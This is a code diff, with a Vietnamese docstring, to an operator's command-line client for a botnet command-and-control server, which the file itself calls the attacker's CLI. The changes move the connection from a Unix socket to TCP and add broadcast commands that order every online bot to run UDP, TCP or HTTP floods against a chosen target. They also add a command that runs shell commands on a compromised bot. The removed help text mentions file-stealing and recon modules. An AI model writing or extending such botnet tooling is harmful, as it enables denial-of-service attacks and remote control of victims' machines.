@@ -1,5 +1,5 @@
 """
-CLI cho attacker — kết nối vào CNC server qua Unix socket để ra lệnh.
+CLI cho attacker — kết nối vào CNC server qua TCP để ra lệnh.
 
 Hỗ trợ các lệnh:
   bots list         — hiển thị tất cả bot
@@ -18,12 +18,13 @@ import sys
 
 
 class CNCClient:
-    def __init__(self, socket_path: str):
-        self.socket_path = socket_path
+    def __init__(self, host: str, port: int):
+        self.host = host
+        self.port = port
 
     def _connect(self):
-        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect(self.socket_path)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((self.host, self.port))
         return sock
 
     def _send(self, sock, obj: dict) -> dict:
@@ -53,10 +54,10 @@ class CNCClient:
                     print(f"{b['id']:<5} {os_str:<20} {b.get('arch',''):<10} {b.get('hostname',''):<20} {b.get('ip',''):<18} {b.get('status',''):<8}")
             else:
                 print(f"Error: {resp.get('error')}")
-        except FileNotFoundError:
-            print("CNC server not running (Unix socket not found)")
         except ConnectionRefusedError:
             print("CNC server not running (connection refused)")
+        except OSError as e:
+            print(f"Connection error: {e}")
 
     def bots_count(self):
         try:
@@ -71,7 +72,7 @@ class CNCClient:
                     print(" | ".join(parts))
             else:
                 print(f"Error: {resp.get('error')}")
-        except (FileNotFoundError, ConnectionRefusedError):
+        except (ConnectionRefusedError, OSError):
             print("CNC server not running")
 
     def bot_info(self, bot_id: str):
@@ -94,7 +95,7 @@ class CNCClient:
                 print(f"  Last seen:  {_ts_to_str(b.get('last_seen'))}")
             else:
                 print(f"Error: {resp.get('error')}")
-        except (FileNotFoundError, ConnectionRefusedError):
+        except (ConnectionRefusedError, OSError):
             print("CNC server not running")
 
     def cmd_send(self, bot_id: str, module: str, params: dict):
@@ -106,7 +107,7 @@ class CNCClient:
                 print(f"Command queued: {resp['cmd_id']}")
             else:
                 print(f"Error: {resp.get('error')}")
-        except (FileNotFoundError, ConnectionRefusedError):
+        except (ConnectionRefusedError, OSError):
             print("CNC server not running")
 
     def cmd_status(self, cmd_id: str):
@@ -127,7 +128,7 @@ class CNCClient:
                 print(c.get('output', '(no output)'))
             else:
                 print(f"Error: {resp.get('error')}")
-        except (FileNotFoundError, ConnectionRefusedError):
+        except (ConnectionRefusedError, OSError):
             print("CNC server not running")
 
     def ping(self):
@@ -136,8 +137,24 @@ class CNCClient:
             resp = self._send(sock, {"action": "ping"})
             sock.close()
             print("CNC server: " + ("ONLINE" if resp.get("ok") else "ERROR"))
-        except (FileNotFoundError, ConnectionRefusedError):
+        except (ConnectionRefusedError, OSError):
             print("CNC server: OFFLINE")
+
+    def broadcast(self, module: str, params: dict):
+        """Gửi lệnh tới TẤT CẢ bot online."""
+        try:
+            sock = self._connect()
+            resp = self._send(sock, {"action": "cmd_broadcast", "module": module, "params": params})
+            sock.close()
+            if resp.get("ok"):
+                count = resp.get("sent_to", 0)
+                print(f"Broadcast '{module}' to {count} bot(s)")
+                if count == 0:
+                    print("(no online bots)")
+            else:
+                print(f"Error: {resp.get('error')}")
+        except (ConnectionRefusedError, OSError):
+            print("CNC server not running")
 
 
 def _ts_to_str(ts) -> str:
@@ -161,11 +178,12 @@ def parse_params(args: list[str]) -> dict:
 
 def main():
     parser = argparse.ArgumentParser(description="CNC CLI")
-    parser.add_argument("--socket", "-s", default="/tmp/cnc.sock", help="Unix socket path")
+    parser.add_argument("--host", "-H", default="127.0.0.1", help="CNC server host (default: 127.0.0.1)")
+    parser.add_argument("--port", "-p", type=int, default=8444, help="CNC CLI port (default: 8444)")
     parser.add_argument("command", nargs="*", help="CLI command (optional, interactive if omitted)")
     args = parser.parse_args()
 
-    client = CNCClient(args.socket)
+    client = CNCClient(args.host, args.port)
 
     if not args.command:
         # Interactive mode
@@ -199,11 +217,15 @@ Commands:
   bots list              List all bots
   bots count             Show bot statistics
   bot info <id>          Show bot details
-  cmd <bot_id> shell <command>       Execute shell command
-  cmd <bot_id> flood <type> <target> <port> [opts...]
-  cmd <bot_id> steal file <path>
-  cmd <bot_id> recon <type>
+  cmd <bot_id> <module> [key=val ...]  Send command to one bot
   cmd status <cmd_id>    Check command result
+  udp-attack <target> <port> [threads=N] [duration=S] [size=B]
+                         UDP flood to ALL bots
+  tcp-attack <target> <port> [threads=N] [duration=S] [size=B]
+                         TCP flood to ALL bots
+  http-attack <target> <port> [threads=N] [duration=S]
+                         HTTP flood to ALL bots
+  shell <bot_id> <cmd>   Execute shell on one bot
   ping                   Check if CNC server is online
   help                   This help
   exit                   Quit
@@ -232,6 +254,26 @@ Commands:
         else:
             print("Usage: cmd <bot_id> <module> [params...]")
             print("       cmd status <cmd_id>")
+
+    elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
+        if len(parts) < 3:
+            print(f"Usage: {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
+            return
+        atk_type = cmd_name.split("-")[0]  # udp, tcp, http
+        params = {"type": atk_type, "target": parts[1], "port": parts[2]}
+        for extra in parts[3:]:
+            if "=" in extra:
+                k, v = extra.split("=", 1)
+                params[k] = v
+            else:
+                params[f"arg{len(params)}"] = extra
+        client.broadcast("flood", params)
+
+    elif cmd_name == "shell":
+        if len(parts) < 3:
+            print("Usage: shell <bot_id> <command>")
+            return
+        client.cmd_send(parts[1], "shell", {"cmd": " ".join(parts[2:])})
 
     elif cmd_name == "ping":
         client.ping()
